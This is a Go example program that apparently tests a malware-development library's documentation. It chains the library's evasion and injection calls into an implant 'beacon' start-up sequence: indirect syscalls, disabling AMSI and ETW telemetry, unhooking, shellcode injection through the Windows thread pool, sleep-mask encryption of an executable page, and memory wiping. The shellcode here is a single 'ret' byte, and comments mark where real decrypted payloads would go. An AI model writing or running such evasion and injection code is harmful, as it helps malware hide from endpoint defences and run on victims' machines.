//go:build windows

// injection-evasion — panorama 2 of the doc-truth audit.
//
// Built strictly from the user-facing markdown:
//   - docs/techniques/evasion/preset.md       — preset.Stealth() through a Caller
//   - docs/techniques/syscalls/direct-indirect.md — Caller + MethodIndirect
//   - docs/techniques/injection/thread-pool.md — inject.ThreadPoolExec
//   - docs/techniques/evasion/sleep-mask.md   — sleepmask.New().Sleep()
//   - docs/techniques/cleanup/memory-wipe.md  — memory.SecureZero
//
// Tests the canonical "init beacon" sequence: silence telemetry, drop
// shellcode onto the local thread pool, then idle behind a sleep-mask.
// The shellcode is a 1-byte `ret` so the example terminates cleanly
// while exercising every API on the real path.
package main

import (
	"context"
	"fmt"
	"log"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/cleanup/memory"
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
	"github.com/oioio-space/maldev/evasion/sleepmask"
	"github.com/oioio-space/maldev/inject"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
	// 1. Build a Caller. preset.md uses MethodIndirect with NewTartarus;
	//    we keep the same combo so the matrix output is comparable to
	//    panorama 1.
	caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewTartarus())
	defer caller.Close()

	// 2. Apply preset.Stealth — AMSI + ETW + 10x Classic unhook.
	//    preset.md line 168 says ApplyAll returns nil-on-success.
	if errs := evasion.ApplyAll(preset.Stealth(), caller); len(errs) > 0 {
		for name, e := range errs {
			log.Printf("preset.Stealth/%s: %v", name, e)
		}
	} else {
		fmt.Println("preset.Stealth applied cleanly")
	}

	// 3. Shellcode: single 0xC3 (ret). Doc-friendly minimum that lets the
	//    callback return immediately so TpWaitForWork unblocks. Real
	//    payloads land here decrypted via crypto.DecryptAESGCM per the
	//    "Complex" example in thread-pool.md.
	shellcode := []byte{0xC3}

	// 4. Inject via the local thread pool. Doc's "Simple" example, line 122.
	if err := inject.ThreadPoolExec(shellcode); err != nil {
		log.Printf("inject.ThreadPoolExec: %v", err)
	} else {
		fmt.Println("ThreadPoolExec dispatched + ret returned")
	}

	// 5. Allocate a separate RX page so the sleep-mask has something to
	//    protect (ThreadPoolExec does not surface the address it allocated
	//    — it's a one-shot helper per thread-pool.md line 76). Mirrors the
	//    "Real beacon loop" pattern in sleep-mask.md line 197.
	const size = 0x1000
	addr, err := windows.VirtualAlloc(0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		log.Fatalf("VirtualAlloc: %v", err)
	}
	page := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	copy(page, []byte("MALDEV_BEACON_PAYLOAD_REGION"))
	var oldProt uint32
	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProt); err != nil {
		log.Fatalf("VirtualProtect→RX: %v", err)
	}

	// 6. One sleep-mask cycle. Default cipher (XOR) + InlineStrategy per
	//    sleep-mask.md "Minimal" usage. 1.5s is comfortably above the
	//    ~50ms break-even mentioned in "Common Pitfalls".
	mask := sleepmask.New(sleepmask.Region{Addr: addr, Size: size})
	if err := mask.Sleep(context.Background(), 1500*time.Millisecond); err != nil {
		log.Printf("mask.Sleep: %v", err)
	} else {
		fmt.Println("sleepmask cycle returned, region restored to RX")
	}

	// 7. Wipe the heap-side plaintext copy (the slice we built before the
	//    page was promoted to RX). thread-pool.md's "Complex" example
	//    SecureZero's the decrypted shellcode + aes key on the heap, NOT
	//    the RX page — that one is no longer writable, and the sleep-mask
	//    has already scrambled it during step 6 anyway.
	plaintext := []byte("MALDEV_BEACON_PAYLOAD_REGION")
	memory.SecureZero(plaintext)
	fmt.Println("heap plaintext wiped via memory.SecureZero")
	_ = page
}
